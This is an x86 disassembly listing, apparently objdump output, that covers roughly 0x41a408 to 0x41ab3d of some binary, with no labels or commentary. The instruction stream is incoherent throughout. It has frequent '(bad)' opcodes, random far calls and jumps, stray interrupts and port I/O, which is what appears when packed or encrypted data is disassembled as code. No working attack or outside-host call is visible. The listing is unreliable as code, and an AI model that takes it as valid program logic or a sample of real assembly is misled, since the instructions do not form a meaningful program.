  41a408:	mov    ebp,ss
  41a40a:	int    0x98
  41a40c:	xlat   BYTE PTR ds:[ebx]
  41a40d:	mov    esp,DWORD PTR [edi-0x5]
  41a410:	inc    bh
  41a412:	clc    
  41a413:	mov    fs,WORD PTR ds:0x38ee2ae0
  41a419:	je     0x41a3e4
  41a41b:	mov    WORD PTR [esi+0x37],ss
  41a41e:	jecxz  0x41a469
  41a420:	or     al,0xa4
  41a422:	fwait
  41a423:	pop    ebp
  41a424:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a426:	fld    TBYTE PTR [ebx+edi*2+0x20]
  41a42a:	es das 
  41a42c:	xor    ebp,DWORD PTR [esi]
  41a42e:	push   cs
  41a42f:	in     al,0x6b
  41a431:	dec    esi
  41a432:	sub    eax,0xd1e3cd49
  41a437:	dec    edx
  41a438:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a43a:	shr    DWORD PTR [edi],cl
  41a43c:	xor    cl,BYTE PTR [edi]
  41a43e:	enter  0x5fc9,0x4b
  41a442:	ds pop ecx
  41a444:	lods   eax,DWORD PTR ds:[esi]
  41a445:	xchg   eax,ecx
  41a447:	fcomp  DWORD PTR [eax-0x677a3607]
  41a44d:	and    ch,ah
  41a44f:	mov    dh,0x79
  41a451:	rol    BYTE PTR [ecx+0x4dd23cdd],0xcb
  41a458:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a459:	and    DWORD PTR [ecx+0x5b],ebx
  41a45c:	xor    al,BYTE PTR ss:[esi+0x6b]
  41a460:	cmp    BYTE PTR [ecx+eax*2],ch
  41a463:	inc    ecx
  41a464:	mov    edi,0x7b116ea1
  41a469:	push   eax
  41a46a:	cdq    
  41a46b:	scas   al,BYTE PTR es:[edi]
  41a46c:	loopne 0x41a4e9
  41a46e:	sar    DWORD PTR [eax+0x3c],0xf3
  41a472:	hlt    
  41a473:	gs inc esi
  41a475:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a476:	cmp    dh,BYTE PTR [esi]
  41a478:	jae    0x41a4e9
  41a47a:	and    eax,0x844ea08e
  41a47f:	in     al,0xff
  41a481:	int    0xaa
  41a483:	and    DWORD PTR [ebx+0x2],ecx
  41a486:	mov    bh,0x9f
  41a488:	adc    al,0x63
  41a48a:	mov    bl,0x11
  41a48c:	jmp    0x41a440
  41a48e:	pop    es
  41a48f:	fbstp  TBYTE PTR [edi]
  41a491:	jo     0x41a4c4
  41a493:	es in  al,0xe9
  41a496:	aad    0x9c
  41a498:	mov    al,ds:0xbbf5e424
  41a49d:	call   0x8fe2:0x1618931b
  41a4a4:	shl    DWORD PTR [eax+0x2a],0xdd
  41a4a8:	and    al,0x54
  41a4aa:	(bad)  
  41a4ab:	test   DWORD PTR [edi-0x8e2a19c],0x1f070726
  41a4b5:	mov    edx,0xcbd1b21a
  41a4ba:	xchg   ebp,eax
  41a4bb:	pop    es
  41a4bc:	jns    0x41a45f
  41a4be:	rol    DWORD PTR ds:[edx-0x68],0xd7
  41a4c3:	hlt    
  41a4c4:	cmp    esi,DWORD PTR [edi+0x2f]
  41a4c7:	stos   DWORD PTR es:[edi],eax
  41a4c8:	xchg   esp,eax
  41a4c9:	repnz cmp edi,DWORD PTR [ecx-0x5e]
  41a4cd:	mov    ds:0x6950729b,al
  41a4d2:	fild   QWORD PTR [ebx-0x24]
  41a4d5:	imul   DWORD PTR [eax+0x74]
  41a4d8:	mov    esp,0x4ea7741
  41a4dd:	sub    edx,DWORD PTR [edi+eax*4]
  41a4e0:	(bad)  
  41a4e1:	pop    ds
  41a4e2:	cmp    ax,0x9ded
  41a4e6:	sub    bl,cl
  41a4e8:	fs jmp 0x41a524
  41a4eb:	stos   DWORD PTR es:[edi],eax
  41a4ec:	mov    ebx,0x1d619d44
  41a4f1:	and    bl,BYTE PTR [edi+0x165a2625]
  41a4f7:	div    BYTE PTR [esi+0x79]
  41a4fa:	cli    
  41a4fb:	adc    edx,ebx
  41a4fd:	ret    0x1820
  41a500:	add    cl,al
  41a502:	and    al,0x3b
  41a504:	xchg   DWORD PTR [edi-0x1],esp
  41a507:	fs mov cl,0xf7
  41a50a:	stc    
  41a50b:	push   ebx
  41a50c:	sub    al,0xcb
  41a50e:	call   0x224a9a51
  41a513:	push   edi
  41a514:	(bad)  
  41a515:	(bad)  
  41a517:	cs dec eax
  41a519:	fld    TBYTE PTR [edx]
  41a51b:	pop    ebp
  41a51c:	xchg   edx,eax
  41a51d:	retf   
  41a51e:	xlat   BYTE PTR ds:[ebx]
  41a51f:	int    0x52
  41a521:	gs leave 
  41a523:	fimul  WORD PTR [ebp-0x68]
  41a526:	test   al,0x58
  41a528:	imul   eax,ebp,0x5dd77ec4
  41a52e:	sub    al,0xed
  41a530:	retf   0xb919
  41a533:	sar    DWORD PTR [edi-0x78abeae1],cl
  41a539:	jnp    0x41a4c1
  41a53b:	mov    bh,0xe9
  41a53d:	iret   
  41a53e:	xchg   BYTE PTR [ecx+0x23adde52],cl
  41a544:	jge    0x41a54f
  41a546:	inc    ebp
  41a547:	jge    0x41a568
  41a549:	inc    ebp
  41a54a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a54b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a54c:	or     DWORD PTR [ebx+0x5c],ebp
  41a54f:	xor    bl,al
  41a551:	and    al,0x67
  41a553:	sbb    edi,eax
  41a555:	(bad)  
  41a556:	cmp    BYTE PTR [ecx-0x3e],bh
  41a559:	addr16 cdq 
  41a55b:	mov    dh,0x43
  41a55d:	jbe    0x41a5ac
  41a55f:	gs xor bl,dl
  41a562:	mov    ebx,0x7acaa8ee
  41a567:	stc    
  41a568:	aas    
  41a569:	repz mov bh,0xce
  41a56c:	loope  0x41a538
  41a56e:	xchg   ebp,eax
  41a56f:	push   ecx
  41a570:	xor    DWORD PTR [ebx-0x1be1cb84],ecx
  41a576:	add    al,0x6a
  41a578:	ja     0x41a554
  41a57a:	push   ecx
  41a57b:	mov    eax,0xa048ce12
  41a580:	test   eax,ecx
  41a582:	mov    ecx,0x26a81be2
  41a587:	in     al,dx
  41a588:	push   es
  41a589:	xchg   ebx,eax
  41a58a:	jnp    0x41a521
  41a58c:	xor    BYTE PTR [ecx-0xc],bh
  41a58f:	test   esi,edx
  41a591:	inc    edi
  41a592:	loop   0x41a564
  41a594:	push   0x733df1f1
  41a599:	ja     0x41a571
  41a59b:	jno    0x41a5ee
  41a59d:	pop    ds
  41a59e:	dec    ecx
  41a59f:	aas    
  41a5a0:	cdq    
  41a5a1:	cmp    al,0x0
  41a5a3:	pop    ds
  41a5a4:	icebp  
  41a5a5:	dec    ebx
  41a5a6:	pop    ebp
  41a5a7:	inc    edi
  41a5a8:	ja     0x41a5f1
  41a5aa:	xchg   esp,eax
  41a5ab:	inc    edx
  41a5ac:	shr    BYTE PTR [edx],1
  41a5ae:	shr    DWORD PTR [eax+0x10],cl
  41a5b1:	sub    al,0xe1
  41a5b3:	cmc    
  41a5b4:	adc    al,0xaa
  41a5b6:	(bad)  
  41a5b7:	xlat   BYTE PTR ds:[ebx]
  41a5b8:	outs   dx,DWORD PTR ds:[esi]
  41a5b9:	ja     0x41a5b7
  41a5bb:	push   0xde957b99
  41a5c0:	mov    esi,DWORD PTR [ecx]
  41a5c2:	(bad)  
  41a5c4:	jmp    0x489e7687
  41a5c9:	add    al,0x1f
  41a5cb:	fmul   QWORD PTR [edx+0x7fe565]
  41a5d1:	out    0xf5,eax
  41a5d3:	stos   DWORD PTR es:[edi],eax
  41a5d4:	(bad)  
  41a5d5:	push   esp
  41a5d6:	sbb    eax,0x76e5fd50
  41a5db:	adc    cl,BYTE PTR [ebx+0x67b824e2]
  41a5e1:	dec    ebp
  41a5e2:	or     BYTE PTR [ebp-0x1d],bl
  41a5e5:	xchg   BYTE PTR [ecx],bl
  41a5e7:	xchg   esp,eax
  41a5e8:	mov    al,0x69
  41a5ea:	das    
  41a5eb:	cdq    
  41a5ec:	jne    0x41a596
  41a5ee:	mov    al,ds:0xd88fd515
  41a5f3:	inc    edi
  41a5f4:	dec    ebp
  41a5f5:	and    dh,BYTE PTR [ebp+0x58]
  41a5f8:	cmp    BYTE PTR [edx-0x56ca61be],bh
  41a5fe:	pop    ebp
  41a5ff:	mov    dh,0x46
  41a601:	dec    edx
  41a602:	faddp  st(4),st
  41a604:	push   es
  41a605:	ins    BYTE PTR es:[edi],dx
  41a606:	test   BYTE PTR [ebp+edx*1+0x51],cl
  41a60a:	xchg   ebx,edx
  41a60c:	jp     0x41a5e3
  41a60e:	mov    edi,0x68cf17c2
  41a613:	cmp    BYTE PTR [edx-0x6],al
  41a616:	cdq    
  41a617:	add    dl,BYTE PTR ds:0x9ce1440f
  41a61d:	pop    ecx
  41a61e:	xchg   ebp,eax
  41a61f:	in     eax,0x21
  41a621:	and    DWORD PTR [eax],ebp
  41a623:	cs add eax,0xf8033f7
  41a629:	sti    
  41a62a:	or     DWORD PTR [ebx-0x36],eax
  41a62d:	push   es
  41a62e:	int    0xb
  41a630:	je     0x41a63a
  41a632:	test   eax,0xa8d9e4fd
  41a637:	lods   eax,DWORD PTR ds:[esi]
  41a638:	mov    ah,0xc2
  41a63a:	bound  edx,QWORD PTR [ecx+eax*2+0x2d]
  41a63e:	dec    eax
  41a63f:	xchg   esp,eax
  41a640:	imul   ebx,DWORD PTR [edx+0x28],0x21f3ce48
  41a647:	mov    cl,cl
  41a649:	push   eax
  41a64a:	rcr    BYTE PTR [ecx+0x2600e69f],1
  41a650:	frstor [ebx]
  41a652:	out    0x37,eax
  41a654:	pop    ebp
  41a655:	mov    ebx,ebx
  41a657:	pushf  
  41a658:	sbb    ecx,DWORD PTR [ecx]
  41a65a:	inc    esp
  41a65b:	sub    al,0x9e
  41a65d:	push   edi
  41a65e:	push   cs
  41a65f:	mov    ebx,0x12aabe9c
  41a664:	int    0xc5
  41a666:	mov    ebx,0x3d31b0bc
  41a66b:	xor    esi,DWORD PTR [ecx-0x639eabeb]
  41a671:	pop    es
  41a672:	call   0xcb62:0x27b78bc
  41a679:	mov    ebp,0x1cfb521b
  41a67e:	cdq    
  41a67f:	or     DWORD PTR [ecx-0x63c92c36],esp
  41a685:	jge    0x41a6d3
  41a687:	inc    ebx
  41a688:	test   eax,0x14699acd
  41a68d:	sub    ebp,DWORD PTR [eax+0x5b]
  41a690:	icebp  
  41a691:	cwde   
  41a692:	mov    eax,0x63389641
  41a697:	mov    ds:0x2c2ef346,eax
  41a69c:	push   ecx
  41a69d:	imul   edx,DWORD PTR [esp+ebx*4],0x4dd69dbc
  41a6a4:	addr16 sbb al,0x77
  41a6a7:	pop    ss
  41a6a8:	sbb    BYTE PTR [edx],cl
  41a6aa:	cmove  esp,DWORD PTR [eax-0x6e85137c]
  41a6b1:	jbe    0x41a69f
  41a6b3:	in     eax,dx
  41a6b4:	add    eax,DWORD PTR [eiz*2+0x41257d9f]
  41a6bb:	test   eax,0xe145e9bb
  41a6c0:	shl    BYTE PTR [ecx],cl
  41a6c2:	rol    DWORD PTR ds:0xf0a42c40,cl
  41a6c8:	retf   
  41a6c9:	aam    0xa
  41a6cb:	mov    cl,BYTE PTR [esi-0x1cb1978b]
  41a6d1:	out    dx,al
  41a6d2:	add    esp,DWORD PTR [ebp+eax*4+0x8f2831c]
  41a6d9:	sub    BYTE PTR [esi],al
  41a6db:	mov    ebx,0xffa3adab
  41a6e0:	sbb    DWORD PTR [edx+ebx*8-0x66],esp
  41a6e4:	pushf  
  41a6e5:	in     eax,0xf9
  41a6e7:	in     al,dx
  41a6e8:	scas   al,BYTE PTR es:[edi]
  41a6e9:	cmp    al,0x9f
  41a6eb:	lea    ecx,[edx]
  41a6ed:	sbb    al,0x9f
  41a6ef:	retf   0x4cd
  41a6f2:	xchg   ah,ch
  41a6f4:	and    eax,0xd34f17f4
  41a6f9:	mov    esi,0xc7e7182e
  41a6fe:	cdq    
  41a6ff:	not    DWORD PTR [ebp-0x6]
  41a702:	adc    DWORD PTR [ebp+0x43],0x6f292e14
  41a709:	adc    al,0x13
  41a70b:	dec    eax
  41a70c:	pop    ebp
  41a70d:	dec    edx
  41a70e:	add    DWORD PTR es:[ecx-0x7d],esi
  41a712:	pusha  
  41a713:	mov    cl,0xcf
  41a715:	xor    al,0xc6
  41a717:	cmp    dh,BYTE PTR [ebp-0x20a2a815]
  41a71d:	adc    ebp,DWORD PTR [eax-0x269fe511]
  41a723:	mov    ah,0x26
  41a725:	sub    DWORD PTR [ecx-0x11],ebx
  41a728:	into   
  41a729:	loop   0x41a744
  41a72b:	push   ebx
  41a72c:	nop
  41a72d:	rcr    DWORD PTR [eax-0x74],cl
  41a730:	and    ch,BYTE PTR [ebx-0x1b]
  41a733:	in     al,dx
  41a734:	jmp    0x9aca:0x282137d
  41a73b:	xor    bh,BYTE PTR [eax]
  41a73d:	addr16 dec ebx
  41a73f:	sub    BYTE PTR es:[ebx-0x4cdf92eb],0xd0
  41a747:	sub    DWORD PTR [eax],eax
  41a749:	stos   DWORD PTR es:[edi],eax
  41a74a:	fcom   QWORD PTR ds:0xdb00111a
  41a750:	jle    0x41a7a8
  41a752:	sub    BYTE PTR [ebx+0x43],bh
  41a755:	pusha  
  41a756:	mov    dl,0x2c
  41a758:	fs fs dec ebx
  41a75b:	mov    WORD PTR [edi+0x10],cs
  41a75e:	je     0x41a765
  41a760:	enter  0x1516,0xeb
  41a764:	inc    ebx
  41a765:	gs cli 
  41a767:	cmp    edx,DWORD PTR [edi-0x7bb25835]
  41a76d:	jecxz  0x41a72c
  41a76f:	(bad)  
  41a770:	pop    ebp
  41a771:	inc    esp
  41a772:	sbb    esi,DWORD PTR [edi-0x73]
  41a775:	or     al,BYTE PTR [edi-0x5d]
  41a778:	mov    ebp,0x5f44ce0
  41a77d:	imul   edi,ebp,0x14
  41a780:	outs   dx,BYTE PTR ds:[si]
  41a782:	hlt    
  41a783:	xchg   esi,eax
  41a784:	mov    cl,0xfd
  41a786:	in     al,0xa7
  41a788:	cs scas al,BYTE PTR es:[edi]
  41a78a:	ret    0xd754
  41a78d:	adc    BYTE PTR [eax],0x71
  41a790:	pop    esp
  41a791:	cmp    eax,0x5f85f354
  41a796:	out    0xd6,eax
  41a798:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41a79a:	pop    edi
  41a79b:	ds jmp 0x41a7bf
  41a79e:	jl     0x41a7b8
  41a7a0:	imul   BYTE PTR [eax]
  41a7a2:	dec    edi
  41a7a3:	int3   
  41a7a4:	scas   al,BYTE PTR es:[edi]
  41a7a5:	in     eax,0xf0
  41a7a7:	sbb    cl,BYTE PTR [eax-0x4c]
  41a7aa:	das    
  41a7ab:	mov    eax,0xb24a63d1
  41a7b0:	fs retf 
  41a7b2:	adc    al,cl
  41a7b4:	mov    al,0x52
  41a7b6:	fs jae 0x41a79f
  41a7b9:	inc    eax
  41a7ba:	shr    BYTE PTR [esi+0x2e9c636a],1
  41a7c0:	mov    cl,0xd1
  41a7c2:	mov    WORD PTR [ebx],cs
  41a7c4:	in     al,dx
  41a7c5:	into   
  41a7c6:	(bad)  
  41a7c7:	out    dx,eax
  41a7c8:	adc    bh,BYTE PTR ds:0x402e0b0a
  41a7ce:	mov    cl,0x4d
  41a7d0:	jae    0x41a838
  41a7d2:	fcom   QWORD PTR [edx-0x53faf730]
  41a7d8:	push   eax
  41a7d9:	addr16 mov esi,0xf8112bc0
  41a7df:	loope  0x41a80d
  41a7e1:	js     0x41a832
  41a7e3:	mov    WORD PTR ds:0x4008c1ff,?
  41a7e9:	inc    esi
  41a7ea:	(bad)  
  41a7eb:	dec    edi
  41a7ec:	mov    ebp,DWORD PTR [ecx-0x63eb9605]
  41a7f2:	and    eax,0xf6bc5eff
  41a7f7:	loopne 0x41a84c
  41a7f9:	setle  BYTE PTR [edi]
  41a7fc:	je     0x41a83f
  41a7fe:	xchg   esi,eax
  41a7ff:	push   eax
  41a800:	pusha  
  41a801:	dec    eax
  41a802:	out    dx,al
  41a803:	mov    ds:0x28670cef,eax
  41a808:	scas   al,BYTE PTR es:[edi]
  41a809:	jge    0x41a7cb
  41a80b:	int3   
  41a80c:	jnp    0x41a81b
  41a80e:	(bad)  
  41a80f:	cmp    eax,DWORD PTR [esi-0x26]
  41a812:	imul   DWORD PTR [edx+0x34322ec5]
  41a818:	scas   ax,WORD PTR es:[edi]
  41a81a:	and    ah,BYTE PTR [edi]
  41a81c:	cmp    DWORD PTR [ebx+0x65ef6e0a],ebx
  41a822:	rcr    dl,cl
  41a824:	js     0x41a803
  41a826:	int3   
  41a827:	and    al,0x6a
  41a829:	out    0xd2,eax
  41a82b:	ins    DWORD PTR es:[edi],dx
  41a82c:	add    ch,BYTE PTR [edi]
  41a82e:	dec    edx
  41a82f:	and    BYTE PTR [eax+0x1f],ah
  41a832:	pop    ds
  41a833:	fwait
  41a834:	gs js  0x41a816
  41a837:	ja     0x41a7d3
  41a839:	jae    0x41a89f
  41a83b:	jmp    0x41a82f
  41a83d:	(bad)  
  41a83e:	fcom   QWORD PTR [eax+0x13076ac2]
  41a844:	cmp    ebx,0x5f
  41a847:	shl    dl,cl
  41a849:	loop   0x41a82f
  41a84b:	mov    esp,0xae6cbdb7
  41a850:	push   0x6d
  41a852:	mov    esi,0xbfa625e9
  41a857:	in     al,dx
  41a858:	mov    esi,0x68c87a5
  41a85d:	dec    esp
  41a85e:	enter  0x9a55,0x93
  41a862:	xchg   edx,eax
  41a863:	ds shr cl,cl
  41a866:	fimul  DWORD PTR [edi-0x14e7aaf8]
  41a86c:	je     0x41a848
  41a86e:	addr16 sahf 
  41a870:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41a872:	inc    esi
  41a873:	or     BYTE PTR [edi-0x80],cl
  41a876:	mov    esp,0x780cd794
  41a87b:	mov    edx,0x8cad4f6a
  41a881:	fmul   DWORD PTR [esi+0x71]
  41a884:	shl    BYTE PTR [edx+0x3b1b915e],cl
  41a88a:	inc    ecx
  41a88b:	xchg   esp,eax
  41a88c:	div    DWORD PTR [ebx-0x63]
  41a88f:	sbb    al,0x3e
  41a891:	daa    
  41a892:	addr16 inc ebx
  41a894:	ds (bad) 
  41a896:	push   ecx
  41a897:	rcr    edx,cl
  41a899:	push   cs
  41a89a:	aaa    
  41a89b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a89c:	inc    ecx
  41a89d:	fnstsw WORD PTR [eax-0x63]
  41a8a0:	loop   0x41a908
  41a8a2:	xor    eax,0x37413d10
  41a8a7:	inc    edi
  41a8a8:	das    
  41a8a9:	mov    ebp,0x1f6cf8a5
  41a8ae:	inc    ecx
  41a8af:	and    DWORD PTR [ebx+esi*4+0x69],edx
  41a8b3:	ins    BYTE PTR es:[edi],dx
  41a8b4:	leave  
  41a8b5:	sub    BYTE PTR ds:0x7d097b52,ch
  41a8bb:	(bad)  [edx]
  41a8bd:	push   ebx
  41a8be:	push   edi
  41a8bf:	inc    esi
  41a8c0:	cmp    esi,DWORD PTR [ecx]
  41a8c2:	adc    ah,al
  41a8c4:	aad    0xe3
  41a8c6:	jne    0x41a91a
  41a8c8:	in     al,dx
  41a8c9:	retf   
  41a8ca:	xor    eax,0x42c49e18
  41a8cf:	xlat   BYTE PTR ds:[ebx]
  41a8d0:	sbb    cl,BYTE PTR [ebp-0x52]
  41a8d3:	sub    DWORD PTR [ebx-0x61],esi
  41a8d6:	pop    es
  41a8d7:	push   esp
  41a8d8:	xor    al,0xe9
  41a8da:	mov    edx,0xcdc0be87
  41a8df:	sbb    eax,DWORD PTR [eax-0x51]
  41a8e2:	inc    edi
  41a8e3:	cmp    dh,BYTE PTR [eax+0x5478ac8b]
  41a8e9:	stos   DWORD PTR es:[edi],eax
  41a8ea:	int3   
  41a8eb:	xchg   DWORD PTR [ebx+ebp*2-0x29],edi
  41a8ef:	cmp    ch,BYTE PTR cs:[ecx-0xc518ffb]
  41a8f6:	imul   edx,DWORD PTR [edx-0x5e6ce7fc],0xe29fe27e
  41a900:	lahf   
  41a901:	or     dl,BYTE PTR [edx+0x6b]
  41a904:	cmp    DWORD PTR [edx+0x17b3757d],ecx
  41a90a:	(bad)  
  41a90b:	push   edi
  41a90c:	pop    ss
  41a90d:	retf   0x67d6
  41a910:	pop    ds
  41a911:	lahf   
  41a912:	xchg   ebx,eax
  41a913:	out    dx,eax
  41a914:	pop    ecx
  41a915:	mov    bh,0x43
  41a917:	fstp   TBYTE PTR [edx-0x6d]
  41a91a:	mov    ?,WORD PTR [ebx+0x1f99e43c]
  41a920:	out    dx,eax
  41a921:	jle    0x41a974
  41a923:	push   es
  41a924:	mov    ecx,DWORD PTR [eax+0x43a00d45]
  41a92a:	data16 jmp 0x41a8f6
  41a92d:	pop    esi
  41a92e:	push   ss
  41a92f:	inc    edx
  41a930:	jl     0x41a921
  41a932:	jmp    0xe6fe:0xd70c68fd
  41a939:	add    eax,DWORD PTR [edi+0x1f1ff995]
  41a93f:	cs jmp 0x41a944
  41a942:	xchg   ebx,eax
  41a943:	pop    eax
  41a944:	dec    eax
  41a945:	fsub   st(7),st
  41a947:	imul   esi,DWORD PTR [edx+0x70434eec],0xffffff95
  41a94e:	add    edx,DWORD PTR [ebx+0x47]
  41a951:	mov    ebx,0x923ddd2e
  41a956:	jbe    0x41a9c4
  41a958:	push   ebp
  41a959:	mov    dh,0x99
  41a95b:	call   0x4130f19f
  41a960:	test   BYTE PTR [eax],cl
  41a962:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a963:	xor    al,0xfe
  41a965:	int    0xfa
  41a967:	ja     0x41a9c9
  41a969:	(bad)  
  41a96a:	aam    0xff
  41a96c:	push   esi
  41a96d:	push   edi
  41a96e:	stos   BYTE PTR es:[edi],al
  41a96f:	(bad)  
  41a970:	leave  
  41a971:	mov    ds:0x233bba6e,al
  41a976:	adc    ebx,DWORD PTR [edi+0x6dde501a]
  41a97c:	jbe    0x41a9fd
  41a97e:	push   esp
  41a97f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a980:	or     bh,cl
  41a982:	clc    
  41a983:	nop
  41a984:	test   eax,0xcde02bfe
  41a989:	aad    0xfc
  41a98b:	fisub  WORD PTR [esi]
  41a98d:	push   edi
  41a98e:	sub    eax,0x7f01dbfb
  41a993:	std    
  41a994:	stc    
  41a995:	sub    BYTE PTR [bx+si],dh
  41a998:	cmp    al,0x57
  41a99a:	arpl   WORD PTR [ecx+0x75],sp
  41a99d:	in     eax,0x64
  41a99f:	jo     0x41a962
  41a9a1:	xchg   esp,eax
  41a9a2:	jae    0x41a939
  41a9a4:	mov    al,0x12
  41a9a6:	sub    DWORD PTR [edi-0x39],esp
  41a9a9:	repnz mov eax,ds:0xec14620a
  41a9af:	push   edi
  41a9b0:	shl    BYTE PTR [ebx-0x24bb684e],0x35
  41a9b7:	mov    cl,0xbc
  41a9b9:	fwait
  41a9ba:	jne    0x41aa32
  41a9bc:	cld    
  41a9bd:	sbb    ebp,esi
  41a9bf:	push   ebp
  41a9c0:	fcomp  QWORD PTR [eax+edx*8-0xd]
  41a9c4:	add    ch,BYTE PTR [edx+0x67]
  41a9c7:	mov    ecx,0x68f63a4a
  41a9cc:	mov    bh,BYTE PTR [esi-0x6a]
  41a9cf:	sbb    BYTE PTR [ebx-0x5c1cb314],al
  41a9d5:	(bad)  
  41a9d6:	fdiv   QWORD PTR [ecx-0xaa04a6f]
  41a9dc:	dec    edi
  41a9dd:	or     eax,0x6a9bc62e
  41a9e2:	aam    0x49
  41a9e4:	push   cs
  41a9e5:	stos   DWORD PTR es:[edi],eax
  41a9e6:	mov    bh,0x76
  41a9e9:	dec    ecx
  41a9ea:	int    0x6c
  41a9ec:	int    0x3
  41a9ee:	jmp    0x7ae2eaa
  41a9f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9f4:	repz (bad)
  41a9f7:	jno    0x41aa2e
  41a9f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9fa:	popf   
  41a9fb:	lods   al,BYTE PTR ds:[esi]
  41a9fc:	int3   
  41a9fd:	pop    esi
  41a9fe:	repz fild DWORD PTR [esi]
  41aa01:	lock pop ebp
  41aa03:	xchg   esi,eax
  41aa04:	push   ebp
  41aa05:	sbb    BYTE PTR [edx],dl
  41aa07:	imul   esi,esp,0x71c48cd0
  41aa0d:	icebp  
  41aa0e:	leave  
  41aa0f:	sub    ecx,ebp
  41aa11:	aam    0xdb
  41aa13:	fst    DWORD PTR [ecx]
  41aa15:	sub    cl,BYTE PTR [edi]
  41aa17:	push   ebx
  41aa18:	push   ebx
  41aa19:	dec    ebp
  41aa1a:	cmc    
  41aa1b:	mov    ah,0x78
  41aa1d:	mov    bl,0x10
  41aa1f:	xor    DWORD PTR [esi],eax
  41aa21:	lds    ebp,FWORD PTR [edx+0x1e]
  41aa24:	daa    
  41aa25:	jge    0x41aa32
  41aa27:	pop    esi
  41aa28:	pop    edx
  41aa29:	dec    ecx
  41aa2a:	cmp    esi,DWORD PTR [eax-0x5cb5b773]
  41aa30:	rol    DWORD PTR [edx-0x51],0x49
  41aa34:	mov    ebx,0xc15893c5
  41aa39:	mov    dh,BYTE PTR [edi+0x3a]
  41aa3c:	xchg   ebx,eax
  41aa3d:	shl    dl,cl
  41aa3f:	aaa    
  41aa40:	shr    BYTE PTR [ebx+0x637d380f],cl
  41aa46:	mov    ds:0x6dcf14b0,al
  41aa4c:	pop    edx
  41aa4d:	shr    DWORD PTR [ebp+0x57481934],0x45
  41aa54:	or     ch,BYTE PTR [esi+edx*2-0x1]
  41aa58:	sbb    dl,BYTE PTR [ecx-0x6]
  41aa5b:	adc    ch,dl
  41aa5d:	sub    esi,edi
  41aa5f:	inc    eax
  41aa60:	sbb    edi,DWORD PTR [esi]
  41aa62:	rol    BYTE PTR [ebx-0x658650ee],0xe0
  41aa69:	push   ds
  41aa6a:	sbb    al,0x74
  41aa6c:	cmp    ebp,edi
  41aa6e:	les    ebx,FWORD PTR [ebx]
  41aa70:	mov    cl,0x6
  41aa72:	out    0xcf,al
  41aa74:	cli    
  41aa75:	xchg   edi,eax
  41aa76:	loop   0x41aa29
  41aa78:	out    dx,eax
  41aa79:	mov    al,0xe7
  41aa7b:	cs loopne 0x41aadc
  41aa7e:	data16 ffreep st(3)
  41aa81:	mov    ah,0x4a
  41aa83:	jmp    0x41aaf5
  41aa85:	std    
  41aa86:	(bad)  
  41aa87:	cwde   
  41aa88:	mov    dh,0x2a
  41aa8a:	ds push edx
  41aa8c:	jbe    0x41aa53
  41aa8e:	bound  edi,QWORD PTR [eax+0x27362252]
  41aa94:	ss inc eax
  41aa96:	retf   0xe565
  41aa99:	pusha  
  41aa9a:	nop
  41aa9b:	stc    
  41aa9c:	dec    ebx
  41aa9d:	popa   
  41aa9e:	dec    edi
  41aa9f:	(bad)  
  41aaa0:	push   esi
  41aaa1:	push   cs
  41aaa2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aaa3:	mov    ah,0x5a
  41aaa5:	push   edx
  41aaa6:	(bad)  
  41aaa7:	jnp    0x41aa87
  41aaa9:	pop    es
  41aaaa:	jle    0x41aa4b
  41aaac:	sar    BYTE PTR gs:[esi],cl
  41aaaf:	mov    dl,0x6b
  41aab1:	lds    ebx,FWORD PTR [edx+eax*8-0x63]
  41aab5:	ins    DWORD PTR es:[edi],dx
  41aab6:	arpl   WORD PTR [ebx],dx
  41aab8:	outs   dx,DWORD PTR ds:[esi]
  41aab9:	add    al,0x5b
  41aabb:	cmp    DWORD PTR [eax+0x5ae81f2a],ecx
  41aac1:	add    eax,0x3c1dd6b5
  41aac6:	xchg   ebx,eax
  41aac7:	adc    eax,0x8256602e
  41aacc:	scas   eax,DWORD PTR es:[edi]
  41aacd:	sar    DWORD PTR [edi+0x27],0xf9
  41aad1:	test   ax,0xb9e5
  41aad5:	pop    es
  41aad6:	ds sbb eax,0xb3807484
  41aadc:	xor    edx,DWORD PTR [edx+0x43d5661a]
  41aae2:	jge    0x41aaf4
  41aae4:	div    DWORD PTR [edi-0x41a4b79c]
  41aaea:	push   DWORD PTR [eax]
  41aaec:	pop    edx
  41aaed:	cmp    ch,0x4c
  41aaf0:	cld    
  41aaf1:	and    bl,BYTE PTR [esi]
  41aaf3:	sub    esp,esp
  41aaf5:	shr    BYTE PTR [eax],1
  41aaf7:	sbb    BYTE PTR [esi+0x69],dh
  41aafa:	sub    ecx,DWORD PTR [edi]
  41aafc:	out    dx,al
  41aafd:	mov    cl,0xa6
  41aaff:	pop    ds
  41ab00:	or     al,0x88
  41ab02:	jae    0x41ab12
  41ab04:	xor    al,0xf7
  41ab06:	mov    DWORD PTR [esi+0x5c],esp
  41ab09:	sbb    al,0x8c
  41ab0b:	rcl    BYTE PTR [edi],0x26
  41ab0e:	pop    ds
  41ab0f:	call   0xfd36ce89
  41ab14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab15:	push   ebp
  41ab16:	jg     0x41aac5
  41ab18:	mov    edi,0x7fadd2cf
  41ab1d:	cli    
  41ab1e:	out    0x52,al
  41ab20:	test   dh,dh
  41ab22:	nop
  41ab23:	daa    
  41ab24:	lahf   
  41ab25:	lods   al,BYTE PTR ds:[esi]
  41ab26:	add    edi,DWORD PTR [edx+0x3335057b]
  41ab2c:	ficom  DWORD PTR [ebx+esi*8-0x6b667f2c]
  41ab33:	sub    bh,BYTE PTR [ebx]
  41ab35:	repnz icebp 
  41ab37:	xor    dl,al
  41ab39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab3a:	pop    ds
  41ab3b:	cdq    
  41ab3c:	xchg   edi,eax
  41ab3d:	aam    0xe8
